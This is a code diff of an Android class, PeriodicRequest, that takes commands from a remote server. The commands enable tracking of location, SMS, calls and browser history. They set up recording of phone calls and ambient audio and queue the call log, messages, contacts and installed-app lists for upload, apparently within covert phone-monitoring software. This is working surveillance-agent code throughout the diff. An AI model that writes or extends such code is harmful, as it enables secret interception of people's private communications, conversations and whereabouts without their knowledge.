@@ -11,32 +11,29 @@ import android.content.SharedPreferences.Editor;
 import android.os.AsyncTask;
 import android.preference.PreferenceManager;
 
-import com.inet.android.archive.ArchiveCall;
-import com.inet.android.archive.ArchiveSms;
-import com.inet.android.bs.Caller;
-import com.inet.android.bs.ListApp;
-import com.inet.android.contacts.GetContacts;
-import com.inet.android.db.RequestDataBaseHelper;
-import com.inet.android.db.RequestWithDataBase;
-import com.inet.android.info.GetInfo;
+import com.inet.android.bs.ServiceControl;
+import com.inet.android.info.DeviceInformation;
+import com.inet.android.list.TurnSendList;
+import com.inet.android.sms.SmsSentObserver;
 import com.inet.android.utils.Logging;
+import com.inet.android.utils.ValueWork;
 
 /**
- * Periodic request class
+ * Periodic request class is designed to handle the server's response
  * 
  * @author johny homicide
  * 
  */
 public class PeriodicRequest extends DefaultRequest {
-	private final String LOG_TAG = "PeriodicRequest";
-	static RequestDataBaseHelper db;
-	private final int type = 2;
+	private final String LOG_TAG = PeriodicRequest.class.getSimpleName()
+			.toString();
+	SmsSentObserver smsSentObserver = null;
 	boolean periodicalFlag = true;
-	Context ctx;
+	private Context mContext;
 
 	public PeriodicRequest(Context ctx) {
 		super(ctx);
-		this.ctx = ctx;
+		this.mContext = ctx;
 	}
 
 	@Override
@@ -66,35 +63,27 @@ public class PeriodicRequest extends DefaultRequest {
 
 	@Override
 	protected void sendPostRequest(String request) {
-		if (!request.equals(" ")) {
-			String str = null;
-			try {
-				Logging.doLog(LOG_TAG, request, request);
-				str = Caller.doMake(request, "periodic", ctx);
-			} catch (IOException e) {
-				e.printStackTrace();
-				db = new RequestDataBaseHelper(ctx);
-
-				if (db.getExistType(type) == false) {
-					db.addRequest(new RequestWithDataBase(request, type));
-				}
-			}
-			if (str != null) {
-				getRequestData(str);
-			} else {
-				Logging.doLog(LOG_TAG,
-						"ответа от сервера нет или он некорректен",
-						"ответа от сервера нет или он некорректен");
-				SharedPreferences sp = PreferenceManager
-						.getDefaultSharedPreferences(ctx);
-				Editor ed = sp.edit();
-				ed.putString("code", "1");
-				ed.commit();
-
-			}
-		} else {
-			Logging.doLog(LOG_TAG, "request == null", "request == null");
+		String str = null;
+		SharedPreferences sp = PreferenceManager
+				.getDefaultSharedPreferences(mContext);
+		try {
+			str = Caller.doMake(null, sp.getString("access_second_token", ""),
+					ConstantValue.PERIODIC_LINK, true, null, mContext);
+		} catch (IOException e) {
+			e.printStackTrace();
+			Logging.doLog(LOG_TAG, "IOException e PeriodicRequest",
+					"IOException e PeriodicRequest");
 		}
+		if (str != null && str.length() > 3)
+			getRequestData(str);
+		else {
+			ParsingErrors.setError(str, "",
+					ConstantValue.TYPE_PERIODIC_REQUEST, -1, "", -1, mContext);
+			Logging.doLog(LOG_TAG, "ответа от сервера нет",
+					"ответа от сервера нет");
+
+		}
+
 	}
 
 	@Override
@@ -103,9 +92,9 @@ public class PeriodicRequest extends DefaultRequest {
 				"getResponseData: " + response);
 
 		SharedPreferences sp = PreferenceManager
-				.getDefaultSharedPreferences(ctx);
-		Editor ed = sp.edit();
+				.getDefaultSharedPreferences(mContext);
 
+		Editor ed = sp.edit();
 		JSONObject jsonObject;
 		try {
 			jsonObject = new JSONObject(response);
@@ -114,131 +103,99 @@ public class PeriodicRequest extends DefaultRequest {
 		}
 
 		String str = null;
+
 		try {
 			str = jsonObject.getString("code");
 		} catch (JSONException e) {
 			str = null;
 		}
 		if (str != null) {
-			ed.putString("code", str);
+			ed.putString("code_periodic", str);
 		} else {
-			ed.putString("code", "");
+			ed.putString("code_periodic", "");
 		}
 
-		// режим ожидания принятия решения
-		if (str.equals("1")) {
-			ed.putString("period", "1");
-			ed.commit();
-			return;
-		}
-
-		// переход в пассивный режим работы
+		// -------------want to remove the device--------
 		if (str.equals("3")) {
-			ed.putString("period", "10");
-			ed.commit();
-			return;
-		}
-
-		// ошибки
-		if (str.equals("0")) {
-			String errstr = null;
+			Logging.doLog(LOG_TAG, "want to remove the device",
+					"want to remove the device");
+			String keyRemoval = null;
 			try {
-				errstr = jsonObject.getString("error");
+				keyRemoval = jsonObject.getString("key");
 			} catch (JSONException e) {
-				errstr = null;
+				keyRemoval = null;
 			}
-			if (errstr != null) {
-				ed.putString("error", errstr);
+			if (keyRemoval != null) {
+				ed.putString("key_removal", keyRemoval);
 			} else {
-				ed.putString("error", "");
+				ed.putString("key_removal", "");
 			}
-			ed.commit();
 			return;
 		}
 
-		// активный режим работы
+		// ----------------errors-----------------
+		if (str.equals("0")) {
+			ParsingErrors.setError(response, mContext);
+			return;
+		}
+
+		// -----------active mode-----------------
 		if (str.equals("2")) {
-			if (sp.getBoolean("getInfo", false) == true) {
-				GetInfo getInfo = new GetInfo(ctx);
-				getInfo.getInfo();
-				ed.putBoolean("getInfo", false);
+			if (sp.getBoolean("is_info", false) == true) {
+				DeviceInformation device = new DeviceInformation(mContext);
+				device.getInfo();
+				ServiceControl.runService(mContext);
+				ed.putBoolean("is_info", false);
 			}
 			ed.putString("period", "1");
-			String listStr = null;
-			try {
-				listStr = jsonObject.getJSONArray("list").toString();
-				Logging.doLog(LOG_TAG, "list: " + listStr, "list: " + listStr);
-				
-				if (listStr.indexOf("1") != -1) {
-					// Вызвать метод для списка звонков
-					Logging.doLog(LOG_TAG, "listStr.indexOf 1", "listStr.indexOf 1");
-					
-					ArchiveCall arhCall = new ArchiveCall();
-					arhCall.execute(ctx);
-				}
-				if (listStr.indexOf("2") != -1) {
-					// Вызвать метод для списка смс
-					Logging.doLog(LOG_TAG, "listStr.indexOf 2", "listStr.indexOf 2");
-					
-					ArchiveSms arhSms = new ArchiveSms();
-					arhSms.execute(ctx);
-//					GetContacts getCont = new GetContacts();
-//					getCont.execute(ctx);
-				}
-				if (listStr.indexOf("3") != -1) {
-					// Вызвать метод для телефонной книги
-					Logging.doLog(LOG_TAG, "listStr.indexOf 3", "listStr.indexOf 3");
-					
-					GetContacts getCont = new GetContacts();
-					getCont.execute(ctx);
-				}
-				if (listStr.indexOf("4") != -1) {
-					// Вызвать метод для установленных приложений
-					Logging.doLog(LOG_TAG, "listStr.indexOf 4", "listStr.indexOf 4");
-					
-					ListApp listApp = new ListApp();
-					listApp.getListOfInstalledApp(ctx);
-				}
-			} catch (JSONException e) {
-				listStr = null;
-			}
-
 			ed.commit();
 		}
 
+		// ----------frequency location 0 - off ------------
 		try {
 			str = jsonObject.getString("geo");
 		} catch (JSONException e) {
 			str = null;
 		}
 		if (str != null) {
+			ValueWork.changeValueMethod(
+					ConstantValue.TYPE_LOCATION_TRACKER_REQUEST, str, mContext);
 			ed.putString("geo", str);
 		} else {
 			ed.putString("geo", "0");
 		}
 
+		/*
+		 * positioning mode 0 - network, 1 - gps ---------
+		 */
 		try {
 			str = jsonObject.getString("geo_mode");
 		} catch (JSONException e) {
 			str = null;
 		}
 		if (str != null) {
+			ValueWork.changeValueMethod(ConstantValue.LOCATION_TRACKER_MODE,
+					str, mContext);
 			ed.putString("geo_mode", str);
 		} else {
-			ed.putString("geo_mode", "1");
+			ed.putString("geo_mode", "0");
 		}
 
+		// -----------monitoring sms----------------
 		try {
 			str = jsonObject.getString("sms");
 		} catch (JSONException e) {
 			str = null;
 		}
 		if (str != null) {
+			ValueWork.changeValueMethod(
+					ConstantValue.TYPE_INCOMING_SMS_REQUEST, str, mContext);
 			ed.putString("sms", str);
 		} else {
 			ed.putString("sms", "0");
 		}
 
+		// ------------monitoring of calls--------------
 		try {
 			str = jsonObject.getString("call");
 		} catch (JSONException e) {
@@ -250,77 +207,69 @@ public class PeriodicRequest extends DefaultRequest {
 			ed.putString("call", "0");
 		}
 
-		try {
-			str = jsonObject.getString("telbook");
-		} catch (JSONException e) {
-			str = null;
-		}
-		if (str != null) {
-			ed.putString("telbook", str);
-		
-		} else {
-			ed.putString("telbook", "0");
-		}
-
-		try {
-			str = jsonObject.getString("listapp");
-		} catch (JSONException e) {
-			str = null;
-		}
-		if (str != null) {
-			ed.putString("listapp", str);
-		} else {
-			ed.putString("listapp", "0");
-		}
-
-		try {
-			str = jsonObject.getString("arhsms");
-		} catch (JSONException e) {
-			str = null;
-		}
-		if (str != null) {
-			ed.putString("arhsms", str);
-//			ArchiveSms arhSms = new ArchiveSms();
-//			arhSms.execute(ctx);
-		} else {
-			ed.putString("arhsms", "0");
-		}
-
-		try {
-			str = jsonObject.getString("arhcall");
-		} catch (JSONException e) {
-			str = null;
-		}
-		if (str != null) {
-			ed.putString("arhcall", str);
-//			ArchiveCall arhCall = new ArchiveCall();
-//			arhCall.execute(ctx);
-		} else {
-			ed.putString("arhcall", "0");
-		}
-
+		// ----------monitoring browser history-----------
 		try {
 			str = jsonObject.getString("www");
 		} catch (JSONException e) {
 			str = null;
 		}
 		if (str != null) {
+			ValueWork.changeValueMethod(
+					ConstantValue.TYPE_HISTORY_BROUSER_REQUEST, str, mContext);
 			ed.putString("www", str);
 		} else {
 			ed.putString("www", "0");
 		}
 
+		// ----------key for record-----------
 		try {
-			str = jsonObject.getString("recall");
+			str = jsonObject.getString("key_rec");
 		} catch (JSONException e) {
 			str = null;
 		}
 		if (str != null) {
-			ed.putString("recall", str);
+			ed.putString("key_rec", str);
 		} else {
-			ed.putString("recall", "0");
+			ed.putString("key_rec", "0");
 		}
 
+		// ----------the number of minutes of Dictaphone-----------
+		try {
+			str = jsonObject.getString("rec_env");
+		} catch (JSONException e) {
+			str = null;
+		}
+		if (str != null) {
+			ed.putString("rec_env", str);
+		} else {
+			ed.putString("rec_env", "0");
+		}
+
+		// ----------record call-----------
+		try {
+			str = jsonObject.getString("rec_call");
+		} catch (JSONException e) {
+			str = null;
+		}
+		if (str != null) {
+			ed.putString("rec_call", str);
+		} else {
+			ed.putString("rec_call", "0");
+		}
+
+		// --recording situation after a telephone conversation-------
+		try {
+			str = jsonObject.getString("rec_env_call");
+		} catch (JSONException e) {
+			str = null;
+		}
+		if (str != null) {
+			ed.putString("rec_env_call", str);
+		} else {
+			ed.putString("rec_env_call", "0");
+		}
+
+		// ----------time server-----------
 		try {
 			str = jsonObject.getString("UTCT");
 		} catch (JSONException e) {
@@ -332,6 +281,7 @@ public class PeriodicRequest extends DefaultRequest {
 			ed.putString("UTCT", "0");
 		}
 
+		// --------start time work------------
 		try {
 			str = jsonObject.getString("time_from");
 		} catch (JSONException e) {
@@ -343,6 +293,7 @@ public class PeriodicRequest extends DefaultRequest {
 			ed.putString("time_from", "");
 		}
 
+		// ------------stop time---------------
 		try {
 			str = jsonObject.getString("time_to");
 		} catch (JSONException e) {
@@ -354,6 +305,7 @@ public class PeriodicRequest extends DefaultRequest {
 			ed.putString("time_to", "");
 		}
 
+		// ---------lunchtime start-------------
 		try {
 			str = jsonObject.getString("brk_from");
 		} catch (JSONException e) {
@@ -365,6 +317,7 @@ public class PeriodicRequest extends DefaultRequest {
 			ed.putString("brk_from", "");
 		}
 
+		// ---------lunchtime stop----------------
 		try {
 			str = jsonObject.getString("brk_to");
 		} catch (JSONException e) {
@@ -376,34 +329,89 @@ public class PeriodicRequest extends DefaultRequest {
 			ed.putString("brk_to", "");
 		}
 
+		// ----------------image and audio detect----------------------
+		String image = null;
+		String audio = null;
 		try {
-			str = jsonObject.getString("error");
-			if (str.equals("0")) {
-				Logging.doLog(LOG_TAG, "account не найден", "account не найден");
-				ed.putString("account", "account");
-			}
-			if (str.equals("1"))
-				Logging.doLog(LOG_TAG,
-						"imei отсутствует или имеет неверный формат",
-						"imei отсутствует или имеет неверный формат");
-			if (str.equals("2"))
-				Logging.doLog(LOG_TAG, "устройство с указанным imei уже есть",
-						"устройство с указанным imei уже есть");
-			if (str.equals("3"))
-				Logging.doLog(LOG_TAG, "отсутствует ключ", "отсутствует ключ");
-			if (str.equals("4"))
-				Logging.doLog(LOG_TAG, "отсутствует или неверный type",
-						"отсутствует или неверный type");
-
+			image = jsonObject.getString("image");
+			audio = jsonObject.getString("audio");
 		} catch (JSONException e) {
 			str = null;
 		}
-		if (str != null) {
-			ed.putString("error", str);
-		} else {
-			ed.putString("error", "");
-		}
+		if (image != null)
+			ed.putString("image", image);
+		if (audio != null)
+			ed.putString("audio", audio);
 
+		// ----------------method of sending files----------------------
+		try {
+			str = jsonObject.getString("dispatch");
+		} catch (JSONException e) {
+			str = null;
+		}
+		if (str != null)
+			ed.putString("dispatch", str);
+		else
+			ed.putString("dispatch", str);
+
+		// ---------------calls list------------------------
+		try {
+			str = jsonObject.getString("calls_list");
+		} catch (JSONException e) {
+			str = null;
+		}
+		if (str != null)
+			if (!str.equals("0")
+					&& sp.getInt("list_call", 0) != Integer.parseInt(str)) {
+				TurnSendList.setList(ConstantValue.TYPE_LIST_CALL,
+						Integer.parseInt(str), null, mContext);
+			}
+
+		// ---------------sms list------------------------
+		try {
+			str = jsonObject.getString("sms_list");
+		} catch (JSONException e) {
+			str = null;
+		}
+		if (str != null)
+			if (!str.equals("0")
+					&& sp.getInt("list_sms", 0) != Integer.parseInt(str)) {
+				TurnSendList.setList(ConstantValue.TYPE_LIST_SMS,
+						Integer.parseInt(str), null, mContext);
+			}
+
+		// ---------------contacts list------------------------
+		try {
+			str = jsonObject.getString("contacts_list");
+		} catch (JSONException e) {
+			str = null;
+		}
+		if (str != null)
+			if (!str.equals("0")
+					&& sp.getInt("list_contact", 0) != Integer.parseInt(str)) {
+				TurnSendList.setList(ConstantValue.TYPE_LIST_CONTACTS,
+						Integer.parseInt(str), null, mContext);
+			}
+
+		// ---------------apps list------------------------
+		try {
+			str = jsonObject.getString("apps_list");
+		} catch (JSONException e) {
+			str = null;
+		}
+		if (str != null)
+			if (!str.equals("0")
+					&& sp.getInt("list_app", 0) != Integer.parseInt(str)) {
+				TurnSendList.setList(ConstantValue.TYPE_LIST_APP,
+						Integer.parseInt(str), null, mContext);
+			}
 		ed.commit();
+		ServiceControl.trackerStateService(mContext);
+	}
+
+	@Override
+	public void sendRequest(int request) {
+		// TODO Auto-generated method stub
+
 	}
 }
